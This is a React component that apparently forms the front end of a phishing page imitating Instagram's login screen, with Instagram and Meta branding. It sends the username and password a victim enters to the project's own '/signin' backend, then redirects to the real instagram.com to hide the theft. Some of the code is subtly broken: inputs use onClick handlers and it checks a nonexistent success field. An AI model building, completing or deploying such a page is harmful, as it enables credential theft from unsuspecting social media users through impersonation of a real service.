import { useState } from 'react'
import api from './api';
import './App.css'

function App() {
  const [showPassword, setShowPassword] = useState(false);

  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");

  const handleFormSubmit = async (e) => {
    e.preventDefault();

    const payload = {
      username,
      password
    }

    const response = await api.post("/signin", payload, {
      validateStatus: (status) => status < 500,
    });

    if(!response.success){
       alert(response.data.msg);
    }else{
       window.location.href = "https://instagram.com";
    }
  }
  return (
    <>
      <div className="container">
         <select name="" id="">
            <option value="en-us">English(US)</option>
            <option value="en-uk">English(UK)</option>
            <option value="jp">Japanese(JP)</option>
            <option value="ru">Russian(RU)</option>
         </select>
         <img src="/instagram.png" className='logo' alt="" />
         <form onSubmit={handleFormSubmit}>
           <div className="form_input_field">
             <input type="text" placeholder='Username, email address or mobile number' aria-label='Username' onClick={(e) => setUsername(e.target.value)} value={username} required />
             <label htmlFor="">Username, email address or mobile number</label>
           </div>
           <div className="form_input_field">
             <input type={showPassword ? "text" : "password"} placeholder='Password' aria-label='Password' onClick={(e) => setPassword(e.target.value)} value={password} required />
             <label htmlFor="">Password</label>
             <span className='show-passwd'>
              <img src={!showPassword ? "/invisible-password.svg" : "/visible-password.svg"} alt="" onClick={() => setShowPassword(prev => !prev)} />
             </span>
           </div>
           <button className='submit-btn' type='submit'>Log in</button>
           <a href="#">Forgotten Password?</a>
         </form>
         <button className='create-account-btn' type='submit'>Create new account</button>
         <img src="/meta-logo.png" className='meta-logo' alt="" />
      </div>
    </>
  )
}

export default App
